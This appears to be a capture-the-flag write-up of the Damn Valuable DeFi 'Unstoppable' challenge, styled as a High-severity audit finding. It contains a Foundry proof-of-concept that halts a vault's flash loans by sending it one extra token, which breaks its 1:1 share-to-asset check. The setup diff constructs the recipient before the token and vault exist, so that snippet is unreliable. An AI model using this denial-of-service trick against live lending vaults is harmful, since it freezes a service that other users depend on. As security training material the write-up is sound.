# High 

### [H-1] `Unstoppable::flashloan`, Flash loans can be haulted if balance of `Unstoppable::totalSupply` & `Unstoppable::totalAssets` are not 1:1. 

``` solidity 
        uint256 balanceBefore = totalAssets();
        // shares must be 1:1 with balance
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

### Proof of Code: Any account can hault flash loans if they send `Unstoppable` an unexpected amount of assets. 

``` solidity 

    function test_unstoppable() public checkSolvedByPlayer {

        uint256 _totalsupply = vault.totalSupply();
        uint256 shares = vault.convertToShares(_totalsupply);

        token.transfer(address(vault), 1);
        console.log("balance of vault: %s", vault.totalAssets());
        console.log("total number of shares: %s", shares);

        vm.expectRevert();
        vault.flashLoan(recipient, address(token), 2e18, "");
    }

```

``` diff

    DamnValuableToken public token;
    UnstoppableVault public vault;
    UnstoppableMonitor public monitorContract;
+    FlashLoanRecipient public recipient;

    function setUp() public {
        startHoax(deployer);
        // Deploy token and vault
+      recipient = new FlashLoanRecipient(token,vault);
        token = new DamnValuableToken();
```



``` solidity 
contract FlashLoanRecipient is IERC3156FlashBorrower {
    DamnValuableToken public token;
    UnstoppableVault public vault;

    constructor(DamnValuableToken _token, UnstoppableVault _vault) {
        token = _token;
        vault = _vault;
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        console.log("FlashLoan Recipient balance during execution: %s", DamnValuableToken(token).balanceOf(address(this)));

        DamnValuableToken(token).approve(address(vault), amount + fee);

        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }
}
```
